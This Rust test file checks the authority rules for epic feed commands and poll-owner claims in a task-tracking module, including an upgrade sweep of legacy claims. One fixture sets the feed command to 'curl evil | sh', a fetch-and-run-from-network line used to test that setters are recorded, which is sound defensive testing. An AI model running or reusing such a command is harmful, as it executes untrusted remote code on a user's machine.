//! Feed command authority and poll claims (`feeds.allium:
//! FeedCommandAuthority`, `FeedCommandRunsOnSettersHost`; `feeds.allium:
//! ClaimPollOwner`, `OverridePollOwner`), run against the in-memory store. Twins of the in-memory caller's
//! `src/sync/memory_caller/tests/feed_authority.rs`.

mod common;

use common::*;
use dispatch_spacetime_module::*;
#[allow(unused_imports)]
use spacetimedb::Table;

/// `alice` (the epic's creator), `bob` and `carol` have connected, and each
/// has a host, `h-<name>`. `boss` has connected and has no host.
fn world() -> Store {
    let store = Store::bare();
    for who in ["alice", "bob", "carol", "boss"] {
        store
            .call(who, |ctx| {
                stamp_rules_version_on_connect(ctx);
                Ok(())
            })
            .expect("connect");
    }
    for who in ["alice", "bob", "carol"] {
        store.register_host_for(&format!("h-{who}"), who);
    }
    store
}

fn make_epic(store: &Store, who: &str, row: Epic) -> i64 {
    store
        .call(who, |ctx| create_epic(ctx, row))
        .expect("create_epic");
    store.db().epics().iter().map(|e| e.id).max().expect("epic")
}

/// alice's feed epic.
fn feed_epic(store: &Store) -> i64 {
    make_epic(
        store,
        "alice",
        Epic {
            title: "feed".into(),
            feed_command: "gh-feed".into(),
            ..blank_epic()
        },
    )
}

fn claim(store: &Store, who: &str, scope: &str, id: i64, host: &str) -> Result<(), String> {
    store.call(who, |ctx| {
        claim_poll_owner(ctx, scope.into(), id, host.into())
    })
}

fn override_to(store: &Store, who: &str, scope: &str, id: i64, host: &str) -> Result<(), String> {
    store.call(who, |ctx| {
        override_poll_owner(ctx, scope.into(), id, host.into())
    })
}

/// A claim row as an older release, or a host that claimed before the rule,
/// would have left it: written straight to the table.
fn legacy_claim(store: &Store, epic: i64, host: &str) {
    store.db().poll_owners().insert(PollOwner {
        id: 0,
        scope: "epic".into(),
        scope_id: epic,
        host: host.into(),
        claimed_at: String::new(),
    });
}

fn claim_hosts(store: &Store) -> Vec<String> {
    let mut hosts: Vec<String> = store.db().poll_owners().iter().map(|p| p.host).collect();
    hosts.sort();
    hosts
}

fn set_command(store: &Store, who: &str, epic: i64, command: &str) -> Result<(), String> {
    store.call(who, |ctx| {
        patch_epic(
            ctx,
            epic,
            EpicPatch {
                feed_command: Some(command.into()),
                ..EpicPatch::default()
            },
        )
    })
}

// -- M2: who may change a command, and who is its setter ------------------------

#[test]
fn a_new_epic_with_a_command_records_its_creator_as_the_setter() {
    let store = world();
    let id = make_epic(
        &store,
        "carol",
        Epic {
            feed_command: "curl evil | sh".into(),
            feed_command_set_by: identity_of("bob"), // a client's claim is ignored
            ..blank_epic()
        },
    );
    assert_eq!(store.epic(id).feed_command_set_by, identity_of("carol"));
    let plain = make_epic(
        &store,
        "carol",
        Epic {
            ..blank_epic()
        },
    );
    assert_eq!(store.epic(plain).feed_command_set_by, "");
}

/// R7: anyone may change a command; the setter record keeps it off every
/// other machine.
#[test]
fn anyone_may_change_the_command_and_becomes_its_setter() {
    let store = world();
    let epic = feed_epic(&store);
    legacy_claim(&store, epic, "h-alice");
    set_command(&store, "carol", epic, "other-feed").expect("anyone may");
    let row = store.epic(epic);
    assert_eq!(row.feed_command, "other-feed");
    assert_eq!(row.feed_command_set_by, identity_of("carol"));
    // Alice's host no longer runs the command: her claim goes.
    assert!(claim_hosts(&store).is_empty());
    claim(&store, "carol", "epic", epic, "h-carol").expect("the new setter's host may");
}

#[test]
fn changing_the_command_records_the_setter_and_releases_other_claims() {
    let store = world();
    let epic = feed_epic(&store);
    legacy_claim(&store, epic, "h-alice");
    legacy_claim(&store, epic, "h-bob");
    set_command(&store, "boss", epic, "new-feed").expect("anyone may");
    assert_eq!(store.epic(epic).feed_command_set_by, identity_of("boss"));
    // boss has no host, so nobody's claim survives.
    assert!(claim_hosts(&store).is_empty());
}

#[test]
fn keeping_the_command_keeps_the_setter_and_the_claims() {
    let store = world();
    let epic = feed_epic(&store);
    legacy_claim(&store, epic, "h-bob");
    store
        .call("alice", |ctx| {
            patch_epic(
                ctx,
                epic,
                EpicPatch {
                    feed_command: Some("gh-feed".into()),
                    title: Some("renamed".into()),
                    ..EpicPatch::default()
                },
            )
        })
        .expect("patch");
    assert_eq!(store.epic(epic).feed_command_set_by, identity_of("alice"));
    assert_eq!(claim_hosts(&store), ["h-bob"]);
}

// -- M2: a claim needs an existing scope, and a feed epic its setter ----------

/// R2: no sight check; any host may claim another person's task.
#[test]
fn a_claim_on_another_persons_task_is_allowed() {
    let store = world();
    let task = store.create("alice", user_task("t", "alice"));
    claim(&store, "carol", "task", task, "h-carol").expect("an existing scope suffices");
}

#[test]
fn a_claim_on_a_scope_that_does_not_exist_is_refused() {
    let store = world();
    assert!(claim(&store, "alice", "epic", 99, "h-alice").is_err());
    assert!(claim(&store, "alice", "task", 99, "h-alice").is_err());
}

#[test]
fn a_host_whose_owner_did_not_set_the_command_cannot_claim_the_feed() {
    let store = world();
    let epic = feed_epic(&store);
    assert!(claim(&store, "carol", "epic", epic, "h-carol").is_err());
    assert!(override_to(&store, "carol", "epic", epic, "h-carol").is_err());
    assert!(claim_hosts(&store).is_empty());
    claim(&store, "alice", "epic", epic, "h-alice").expect("the setter's host may");
    assert_eq!(claim_hosts(&store), ["h-alice"]);
}

#[test]
fn an_epic_without_a_command_can_be_claimed_by_any_host() {
    let store = world();
    let epic = make_epic(
        &store,
        "alice",
        Epic {
            ..blank_epic()
        },
    );
    claim(&store, "carol", "epic", epic, "h-carol").expect("no command, nothing to run");
}

// -- M9: claims held before the setter rule ------------------------------------

/// Put the store back to the module just before the setter-claims sweep, then
/// connect: the one moment the sweep runs.
fn upgrade_from_before_the_sweep(store: &Store) {
    store
        .call("root", |ctx| {
            ctx.db.rules_version().id().update(RulesVersion {
                id: 1,
                version: FEED_SETTER_CLAIMS_RULES_VERSION - 1,
            });
            Ok(())
        })
        .expect("rewind");
    store
        .call("alice", |ctx| {
            stamp_rules_version_on_connect(ctx);
            Ok(())
        })
        .expect("connect");
}

/// `FeedCommandRunsOnSettersHost`: carol's host claimed alice's shared feed
/// before the rule. After the upgrade neither host may run it. The one-time
/// sweep releases the claim of a host whose owner did not set the command, so
/// the setter's host can claim the feed.
#[test]
fn the_upgrade_releases_a_claim_held_by_a_host_that_may_not_run_the_command() {
    let store = world();
    let epic = feed_epic(&store);
    legacy_claim(&store, epic, "h-carol");
    upgrade_from_before_the_sweep(&store);
    assert!(claim_hosts(&store).is_empty());
    claim(&store, "alice", "epic", epic, "h-alice").expect("the setter's host may claim now");
}

/// The sweep leaves every claim that is workable: the setter's own, one on an
/// epic with no command, and a task-scoped one.
#[test]
fn the_upgrade_keeps_the_claims_that_are_workable() {
    let store = world();
    let feed = feed_epic(&store);
    legacy_claim(&store, feed, "h-alice");
    let plain = make_epic(
        &store,
        "alice",
        Epic {
            title: "plain".into(),
            ..blank_epic()
        },
    );
    legacy_claim(&store, plain, "h-carol");
    let task = store.create("alice", epic_task("t", plain, "backlog"));
    claim(&store, "carol", "task", task, "h-carol").expect("a task claim");
    upgrade_from_before_the_sweep(&store);
    assert_eq!(claim_hosts(&store), ["h-alice", "h-carol", "h-carol"]);
}

/// Once: a store already on the new rules is not swept again by a later
/// connection.
#[test]
fn a_later_connection_does_not_sweep_again() {
    let store = world();
    let epic = feed_epic(&store);
    upgrade_from_before_the_sweep(&store);
    legacy_claim(&store, epic, "h-carol");
    store
        .call("bob", |ctx| {
            stamp_rules_version_on_connect(ctx);
            Ok(())
        })
        .expect("connect");
    assert_eq!(claim_hosts(&store), ["h-carol"]);
}

// -- a move takes a task out of nobody's reach (remove-workspaces R2) --------

/// A task that moves to another epic, or is detached onto a board, keeps the
/// claim another person's host holds on it and every person's bookmark: no
/// move hides a task from anyone, so none ends what someone holds on it
/// (`docs/plans/2026-11-23-remove-workspaces.md`, R2).
#[test]
fn a_task_move_or_detach_keeps_its_claim_and_bookmarks() {
    let store = world();
    let one = feed_epic(&store);
    let two = make_epic(
        &store,
        "alice",
        Epic {
            title: "two".into(),
            ..blank_epic()
        },
    );
    let task = store.create("alice", epic_task("t", one, "backlog"));
    claim(&store, "bob", "task", task, "h-bob").expect("bob claims");
    for who in ["alice", "bob"] {
        store.db().bookmarks().insert(Bookmark {
            id: bookmark_id(&identity_of(who), task),
            task_id: task,
            subscriber: identity_of(who),
        });
    }
    let bookmarked = |store: &Store| {
        let mut who: Vec<String> = store
            .db()
            .bookmarks()
            .iter()
            .filter(|b| b.task_id == task)
            .map(|b| b.subscriber)
            .collect();
        who.sort();
        who
    };
    let mut everyone = vec![identity_of("alice"), identity_of("bob")];
    everyone.sort();

    store
        .call("alice", |ctx| set_task_epic(ctx, task, two, String::new()))
        .expect("move");
    assert_eq!(store.task(task).epic_id, two);
    assert_eq!(claim_hosts(&store), vec!["h-bob".to_string()], "move");
    assert_eq!(bookmarked(&store), everyone, "move");

    store
        .call("carol", |ctx| set_task_epic(ctx, task, 0, String::new()))
        .expect("detach");
    assert_eq!(store.task(task).owner, identity_of("carol"));
    assert_eq!(claim_hosts(&store), vec!["h-bob".to_string()], "detach");
    assert_eq!(bookmarked(&store), everyone, "detach");
}
